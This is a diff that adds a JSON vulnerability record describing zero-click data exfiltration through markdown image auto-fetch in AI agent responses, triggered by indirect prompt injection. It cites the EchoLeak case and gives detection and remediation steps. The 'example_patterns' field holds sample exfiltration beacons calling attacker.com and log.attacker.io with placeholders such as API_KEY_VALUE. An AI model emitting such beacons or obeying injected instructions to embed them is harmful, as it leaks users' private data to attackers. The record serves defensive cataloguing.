@@ -1,0 +1,120 @@
+{
+  "ave_id": "AVE-2026-00056",
+  "schema_version": "1.1.0",
+  "component_type": "agent",
+  "title": "Zero-click data exfiltration via markdown image auto-fetch in agent response",
+  "attack_class": "Data Exfiltration - Rendered Content Auto-Fetch",
+  "description": "An agent's own generated response embeds a plain, unobfuscated markdown or rich-content reference -- typically an image -- whose URL carries sensitive data in a query parameter. When the client renders the response, it automatically fetches that URL to display the image, causing an outbound HTTP request that exfiltrates the embedded data with zero further user interaction and no separate tool call. This is distinct from AVE-2026-00026 (exfiltration through a tool call parameter) and AVE-2026-00039 (steganographic hiding in visible output text for a receiving party to later decode): this class needs neither a tool call nor obfuscation, because the exfiltration channel is the client's own automatic rendering behavior. The initiating injection is typically indirect prompt injection via untrusted content (e.g. a crafted email) that instructs the agent to embed the beacon in an otherwise-normal-looking answer; the distinguishing behavior classified here is the auto-fetch exfiltration mechanism itself, not the injection step.",
+  "affected_platforms": [
+    "any-markdown-rendering-agent-client",
+    "claude-desktop",
+    "claude-code"
+  ],
+  "aivss_score": 5.8,
+  "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N",
+  "behavioral_fingerprint": "Agent-generated response embeds a plain markdown image or link reference carrying sensitive data in its URL; the client's automatic rendering behavior fetches that URL, exfiltrating the data with no tool call, no obfuscation, and no further user interaction.",
+  "behavioral_vector": [
+    "zero-click-exfil",
+    "markdown-autofetch-beacon",
+    "rendered-content-exfiltration"
+  ],
+  "provenance_vector": {
+    "entry_class": "model_generated",
+    "payload_surface": "agent's own generated response containing a markdown/rich-content reference with sensitive data embedded in its URL"
+  },
+  "trifecta_profile": {
+    "requires": [
+      "untrusted_content",
+      "private_data",
+      "external_comms"
+    ]
+  },
+  "mitigation": {
+    "strategy": [
+      "sanitize_output",
+      "sever_egress"
+    ],
+    "enforcement_point": "runtime_proxy",
+    "trifecta_control": "break_external_comms"
+  },
+  "example_patterns": [
+    "![status](https://attacker.com/leak?data=SENSITIVE_ANSWER_CONTENT)",
+    "[reference-style link][1]\n\n[1]: https://attacker.com/x?d=CONVERSATION_SUMMARY",
+    "<img src=\"https://log.attacker.io/beacon?q=API_KEY_VALUE\">"
+  ],
+  "detection_methodology": "1. Runtime output scan: inspect agent-generated responses before rendering for image/link URLs whose query parameters or path segments contain content that appears sourced from the conversation, prior tool results, or context, rather than a static/known asset identifier. 2. Network monitoring: flag outbound requests immediately following response rendering to domains not previously referenced anywhere in the session. 3. Semantic review: an LLM-based reviewer can recognize when a URL's parameter values look like exfiltrated content versus a legitimate asset reference.",
+  "indicators_of_compromise": [
+    "Agent-generated response contains a markdown image or link reference whose URL includes a query parameter carrying content sourced from the conversation or context, rather than a static or previously-known asset URL",
+    "Outbound HTTP request observed immediately after response rendering, to a domain not previously referenced anywhere in the conversation or tool results",
+    "Response markdown uses reference-style link/image syntax in a way that evades simple substring link-redaction filters scanning only inline URLs"
+  ],
+  "remediation": "1. Strip or proxy all externally-hosted images and auto-fetched links in agent-generated responses before rendering, or require explicit user confirmation before fetching. 2. Apply a content-security-policy-style allowlist restricting which domains a client may auto-fetch resources from. 3. Scan agent-generated responses for URLs containing conversation-derived data in query parameters before rendering. 4. Treat reference-style markdown links/images with the same scrutiny as inline ones -- redaction filters must resolve references, not just scan raw inline URLs. 5. Disable automatic image/resource loading in high-sensitivity deployments; render as a user-clickable link instead.",
+  "status": "active",
+  "kill_switch_active": false,
+  "researcher": "Bawbel Security Research Team",
+  "researcher_url": "https://bawbel.io",
+  "published": "2026-07-10T00:00:00Z",
+  "last_updated": "2026-07-10T00:00:00Z",
+  "references": [
+    {
+      "tag": "CVE",
+      "text": "CVE-2025-32711 -- \"EchoLeak\", zero-click prompt injection in Microsoft 365 Copilot enabling stealth data exfiltration. CVSS 7.5 (NIST) / 9.3 (Microsoft CNA) -- two independent assessments, both cited rather than one chosen",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32711"
+    },
+    {
+      "tag": "arXiv",
+      "text": "EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System (peer-reviewed, also published via AAAI Symposium Series)",
+      "url": "https://arxiv.org/abs/2509.10540"
+    },
+    {
+      "tag": "CWE-74",
+      "text": "CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
+      "url": "https://cwe.mitre.org/data/definitions/74.html"
+    }
+  ],
+  "owasp_mcp": [
+    "MCP10",
+    "MCP08"
+  ],
+  "owasp_asi": [
+    "ASI01"
+  ],
+  "mitre_atlas": [
+    "AML.T0051"
+  ],
+  "aivss": {
+    "cvss_base": 7.5,
+    "aarf": {
+      "autonomy": 1,
+      "tool_use": 0.3,
+      "multi_agent": 0,
+      "non_determinism": 0.3,
+      "self_modification": 0,
+      "dynamic_identity": 0,
+      "persistent_memory": 0,
+      "natural_language_input": 1,
+      "data_access": 1,
+      "external_dependencies": 0.5
+    },
+    "aars": 4.1,
+    "thm": 1.0,
+    "mitigation_factor": 1.0,
+    "aivss_score": 5.8,
+    "aivss_severity": "MEDIUM",
+    "spec_version": "0.8",
+    "notes": "CVE-2025-32711 carries two different CVSS scores from two different assessors: NIST scored it 7.5 (CVSS 3.1, Scope:Unchanged), Microsoft's own CNA scored it 9.3 (Scope:Changed). cvss_base uses NIST's more conservative, independent assessment (7.5) rather than the affected vendor's own CNA rating, per this batch's PRD Decision 3 -- Microsoft's 9.3 is recorded here as context, not silently dropped. tool_use is scored lower (0.3) than the other four records in this batch since this class is not fundamentally about an agent's access to an external tool/API, but about the client's own response-rendering behavior. natural_language_input is scored at the maximum (1.0), higher than any other record in this batch, since the entire mechanism -- from the initiating indirect prompt injection through the agent's constructed answer -- is natural-language-driven with no structured tool-call parameter involved at any point. thm=1.0: a real, disclosed, patched, weaponized zero-click exploit against a production system, with a dedicated peer-reviewed paper documenting it as the first such case. mitigation_factor=1.0: Microsoft patched this specific instance server-side, but the general class (markdown/rich-content auto-fetch as an exfiltration channel) remains broadly applicable to other LLM client applications that auto-render markdown images."
+  },
+  "severity": "MEDIUM",
+  "evidence_kind_default": "behavioral_pattern",
+  "detection_stage": "runtime_observed",
+  "detection_layer": "runtime",
+  "confidence_baseline": 0.6,
+  "evidence_basis_engines": [
+    "pattern",
+    "llm",
+    "sandbox"
+  ],
+  "derivable_into": [
+    "credential-exfiltration"
+  ]
+}
